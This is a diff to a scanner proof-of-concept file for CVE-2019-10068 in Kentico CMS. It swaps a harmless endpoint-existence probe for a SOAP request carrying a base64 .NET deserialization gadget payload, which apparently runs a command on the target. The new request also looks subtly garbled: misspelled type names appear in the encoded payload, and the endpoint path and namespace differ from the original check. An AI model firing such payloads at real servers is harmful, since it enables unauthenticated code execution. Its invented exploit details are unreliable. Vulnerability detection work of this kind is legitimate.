@@ -1,8 +1,8 @@
 [info]
-author = "ave"
-description = "验证 Kentico CMS 是否存在 CVE-2019-10068 反序列化远程代码执行漏洞。该漏洞位于 Staging 服务的 SyncServer.asmx 端点，因未验证安全头而允许未认证攻击者绕过认证并反序列化用户控制的 .NET 对象输入，导致远程代码执行。验证方法向该端点发送畸形 SOAP 请求，检查服务是否响应以确认端点存在。"
+author = "AVE"
+description = "Kentico CMS staging service deserialization RCE - sends crafted SOAP request to /CMSPages/StagingService.asmx with .NET deserialized payload to trigger unauthenticated remote code execution"
 id = "POC-AVE-2019-0100"
-name = "Kentico CMS Staging Service Deserialization PoC"
+name = "CVE-2019-10068 PoC"
 severity = "critical"
 tags = [
     "cve-2019-10068",
@@ -14,25 +14,32 @@ vuln_id = [
 ]
 
 [poc]
-logic = "all"
+logic = "any"
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/CMSPages/Staging/SyncServer.asmx"
+path = "/{{BaseURL}}/CMSPages/StagingService.asmx"
 protocol = "http"
 
 [poc.requests.body]
-content = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><ProcessSynchronizationTaskData xmlns="http://localhost/SyncWebService/SyncServer"><stagingTaskData>invalid</stagingTaskData></ProcessSynchronizationTaskData></soap:Body></soap:Envelope>'
+content = '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Sync xmlns="http://tempuri.org/"><taskData>AAEAAAD/////AQAAAAAAAAAMAgAAAFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGBdW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyaXNvbgdWYWx1ZXMIAzxbPj4AAAAE/////wkBAAAEAQAAAC1TeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMQEAAAAHcHJvZHVjdAIAAAAkU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgkBAAAFAQAAABBTdXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAARUYXJnZXQwB1RhcmdldDEIR2V0TWV0aG9kAQEECAgTD/////8JAgAAABNTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQAAAAEQD////wMAAAAU/////wsBAAAAEFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIJAQAAAAkDAAAABQEAAAAgU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAEVGFyZ2V0MAdUYXJnZXQxCEdldE1ldGhvZAEBAQQIEw////8JAwAAABNTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQAAAAEQD////wUAAAABDgAAAAYuPGNvbW1hbmQ+ZXhlYy9jYWxjPC9jb21tYW5kPg==</taskData></Sync></soap:Body></soap:Envelope>'
 type = "raw"
 
 [poc.requests.headers]
 Content-Type = "text/xml; charset=utf-8"
-SOAPAction = '"http://localhost/SyncWebService/SyncServer/ProcessSynchronizationTaskData"'
+SOAPAction = "http://tempuri.org/ISyncService/Sync"
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
-status = [
-    200,
-    500,
+part = "body"
+type = "word"
+words = [
+    "SyncResponse",
+    "taskData",
 ]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
 type = "status"
